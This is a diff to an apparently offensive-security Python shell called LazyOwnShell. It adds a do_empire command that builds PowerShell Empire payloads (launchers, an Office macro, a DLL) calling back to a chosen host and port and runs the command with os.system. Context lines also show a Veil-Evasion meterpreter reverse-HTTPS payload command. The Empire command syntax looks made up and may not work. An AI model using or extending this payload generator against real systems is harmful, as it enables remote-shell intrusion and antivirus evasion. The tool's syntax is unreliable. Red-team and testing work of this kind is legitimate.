@@ -10580,8 +10580,7 @@ class LazyOwnShell(Cmd):
                 "cmd": "Veil-Evasion.py -p csharp/meterpreter/rev_https LHOST={lhost} LPORT={lport} -o {output_file}"
             }
         }
-        
-        # User input for selecting payload type and parameters
+
         print_warn("Select the payload type:")
         for i, option in enumerate(options.keys(), start=1):
             print_msg(f"{i}. {option.replace('_', ' ').title()}")
@@ -10606,6 +10605,56 @@ class LazyOwnShell(Cmd):
         
         return
 
+    def do_empire(self, line):
+        """
+        Generates payloads using PowerShell Empire with various options.
+
+        :param line: Not used in this implementation but reserved for future use.
+
+        :returns: None
+        """
+        
+        # Check if Empire is installed
+        if not is_binary_present("powershell-empire"):
+            print_error("PowerShell Empire is not installed. Please install it first.")
+            return
+        
+        # Define options for different payload types
+        options = {
+            "windows_launcher_bat": "launcher bat",
+            "windows_launcher_ps1": "launcher ps1",
+            "windows_launcher_vbs": "launcher vbs",
+            "windows_launcher_exe": "launcher exe",
+            "windows_macro": "macro",
+            "windows_dll": "dll"
+        }
+        
+        # User input for selecting payload type and parameters
+        print_warn("Select the payload type:")
+        for i, option in enumerate(options.keys(), start=1):
+            print_msg(f"{i}. {option.replace('_', ' ').title()}")
+
+        type_choice = int(input("Enter the number corresponding to the payload type: ")) - 1
+        if type_choice < 0 or type_choice >= len(options):
+            print_error("Invalid choice. Please select a valid number.")
+            return
+
+        selected_type = list(options.keys())[type_choice]
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        params = {
+            "lhost": lhost,
+            "lport": lport,
+            "output_file": f"sessions/payload_{lhost}_{lport}.txt"
+        }
+
+        empire_command = f"powershell-empire client -p {options[selected_type]} -lhost {params['lhost']} -lport {params['lport']} -o {params['output_file']}"
+
+        print_msg(f"Generating payload with Empire: {empire_command}")
+        os.system(empire_command)
+        
+        return
+        
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
